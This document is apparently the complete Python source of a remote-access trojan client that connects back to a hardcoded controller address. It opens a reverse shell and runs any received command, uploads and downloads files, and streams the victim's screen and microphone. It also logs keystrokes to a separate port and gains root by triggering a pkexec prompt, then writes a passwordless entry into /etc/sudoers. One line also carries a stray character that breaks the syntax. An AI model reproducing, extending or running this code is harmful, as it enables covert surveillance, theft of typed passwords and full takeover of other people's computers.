#!/usr/bin/env python3

import os
import time
import json
import socket
import struct
import threading
import subprocess
import multiprocessing
from pathlib import Path
import cv2
import numpy as np
import pyautogui
import pyaudio
import mss # for screen capture
from pynput import keyboard

# --- Configuration ---
TARGET_IP       = '192.168.1.113'
TARGET_PORT     = 5555
VIDEO_PORT      = 6666
AUDIO_PORT      = 7777
KEYLOGGER_PORT  = 8888
RECONNECT_DELAY = 1.0

print(f"Target IP       : {TARGET_IP}")
print(f"Target Port     : {TARGET_PORT}")
print(f"Video Port      : {VIDEO_PORT}")
print(f"Audio Port      : {AUDIO_PORT}")
print(f"Keylogger Port  : {KEYLOGGER_PORT}")

# --- Network Helpers ---
def reliable_send(data):
    payload = json.dumps(data).encode()
    s.sendall(payload)

def reliable_recv():
    buffer = ''
    while True:
        try:
            buffer += s.recv(1024).decode().rstrip()
            return json.loads(buffer)
        except ValueError:
            continue

# --- File Transfer ---
def upload_file(src):
    path = Path(src)
    if not path.is_file():
        s.sendall(f"ERROR: File '{src}' not found.".encode())
        return
    with path.open('rb') as fp:
        s.sendall(fp.read())

def download_file(dst):
    with open(dst, 'wb') as fp:
        s.settimeout(1)
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                fp.write(chunk)
            except socket.timeout:
                break
        s.settimeout(None)

# --- Shell Command Handler ---
def shell():
    while True:
        cmd = reliable_recv()
        if cmd == 'quit':
            stop_screen_stream()
            stop_keylogger()
            break
        elif cmd == 'clear':
            continue
        elif cmd.startswith('cd '):
            folder = cmd[3:].strip()
            try:
                os.chdir(folder)
                reliable_send({'stdout': os.getcwd(), 'stderr': ''})
            except FileNotFoundError:
                reliable_send({'stdout': '', 'stderr': f"cd: no such file or directory: {folder}\n"})
        elif cmd.startswith('download '):
            upload_file(cmd.split(' ',1)[1])
        elif cmd.startswith('upload '):
            download_file(cmd.split(' ',1)[1])
        elif cmd == 'screen':
            time.sleep(1)
            start_screen_stream()
        elif cmd == 'keylogger':
            time.sleep(3)
            keylogger_handler()
        elif cmd.startswith('escalate '):
            user = cmd.split(' ',1)[1]
            privilege_escalator(user)
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            reliable_send((out + err).decode(errors='ignore'))

# --- Keylogger ---
# send key presses to the server
def socket_send(target, data):
    try:
        #convert the data to JSON format and then send through the socket 
        target.send(json.dumps(data).encode())
    except:
        pass

# often call when a key is pressed
def on_press(key, target):
    try:
        #check if the key has a char attribute, if not use the name attribute
        char = key.char if hasattr(key, 'char') and key.char else key.name
        socket_send(target, char)
    except:
        pass

# read key presses from the keyboard and send them to the server
def keylogger_reader(target):
    with keyboard.Listener(on_press=lambda k: on_press(k, target)) as listener:
        listener.join()

# use to start the keylogger
def keylogger_handler():
    global keylogger_socket, keylogger_thread
    keylogger_socket = socket.socket()
    try:
        keylogger_socket.connect((TARGET_IP, KEYLOGGER_PORT))
        keylogger_thread = threading.Thread(target=keylogger_reader, args=(keylogger_socket,), daemon=True)
        keylogger_thread.start()
    except:
        pass

def stop_keylogger():
    try:
        keylogger_socket.close()
        keylogger_thread.join(timeout=1)
    except:
        pass

# --- Privilege Escalation ---
read_stream_result = ''

def read_stream(stream):
    global read_stream_result
    for line in iter(stream.readline, b''):
        decoded = line.decode().strip()
        if decoded == 'root':
            read_stream_result = 'root'
    stream.close()

def find_suid_binaries():
    suids = []
    for root, _, files in os.walk('/'):
        for f in files:
            path = os.path.join(root, f)
            try:
                if os.stat(path).st_mode & 0o4000:
                    suids.append(path)
            except:
                continue
    return suids

def privilege_escalator(user):
    global read_stream_result 
    read_stream_result = '' #global variable to store the result of reading the stream (check if the user is root when use command 'whoami')
    reliable_send(os.name) #send the OS name to the server (posix or not)
    suids = find_suid_binaries() ๓ #find all SUID binaries on the system
    result = f"{'Found pkexec' if '/usr/bin/pkexec' in suids else 'NO pkexec'}\n{suids}"
    reliable_send(result)
    if '/usr/bin/pkexec' in suids: # if pkexec is found, start the escalation process
        # wait for the target to authenticate (show pop up window that user need to add password)
        proc = subprocess.Popen('pkexec /bin/bash', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # start threads to read bash shell
        threading.Thread(target=read_stream, args=(proc.stdout,), daemon=True).start()
        threading.Thread(target=read_stream, args=(proc.stderr,), daemon=True).start()
        while True:
            time.sleep(2)
            reliable_send('Waiting for user authentication')
            proc.stdin.write(b'whoami\n') #send command (whoami) to check if the user is root 
            proc.stdin.flush()
            if read_stream_result == 'root':
                reliable_send('AUTHENTICATED')
                break
        # add the user to sudoers file with NOPASSWD option
        cmd = f"echo '{user} ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers_entry && cat /tmp/sudoers_entry >> /etc/sudoers"
        # send the command to the bash shell to add the user to sudoers file
        proc.stdin.write(cmd.encode() + b'\n')
        proc.stdin.flush()
        time.sleep(5)
        out = subprocess.Popen('sudo -l', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        reliable_send('ESCALATION SUCCESSFULLY\n' + (out[0] + out[1]).decode(errors='ignore'))

# --- Screen & Audio Streaming ---
CHUNK, CHANNELS, RATE = 1024, 1, 44100
FORMAT = pyaudio.paInt16 #format for audio stream
screen_process = None # global variable to hold the screen streaming process

#send video of screen via socket
def video_stream(sock):
    w,h = pyautogui.size() # width and height of the screen
    with mss.mss() as sct:
        monitor = {'top':0,'left':0,'width':w,'height':h}
        while True:
            img = np.array(sct.grab(monitor)) # capture the screen and convert to numpy array
            _, buf = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY,50]) # encode the capture screnn to the image as JPEG
            msg = struct.pack('>L', len(buf)) + buf.tobytes()
            try: sock.sendall(msg) #send the encoded image over the socket
            except: break
    sock.close()

#send audio stream via socket
def audio_stream(sock):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK) # open the audio stream from the microphon
    while True:
        data = stream.read(CHUNK, exception_on_overflow=False)
        packet = struct.pack('>L', len(data)) + data
        try: sock.sendall(packet)
        except: break
    sock.close(); stream.stop_stream(); stream.close(); p.terminate()

# --- Screen Streamer Process ---
def screen_streamer():
    v_sock = socket.socket(); v_sock.connect((TARGET_IP, VIDEO_PORT))
    a_sock = socket.socket(); a_sock.connect((TARGET_IP, AUDIO_PORT))
    v_t = threading.Thread(target=video_stream, args=(v_sock,), daemon=True)
    a_t = threading.Thread(target=audio_stream, args=(a_sock,), daemon=True)
    v_t.start(); a_t.start()
    v_t.join(); a_t.join()

def start_screen_stream():
    global screen_process
    screen_process = multiprocessing.Process(target=screen_streamer)
    screen_process.start()

def stop_screen_stream():
    try:
        screen_process.terminate()
        screen_process.join(timeout=1)
    except:
        pass

# --- Main Connection Entry ---
def connect():
    global s
    s = socket.socket()
    while True:
        time.sleep(RECONNECT_DELAY)
        try:
            s.connect((TARGET_IP, TARGET_PORT))
            shell()
            s.close()
            break
        except:
            continue

if __name__ == '__main__':
    connect()
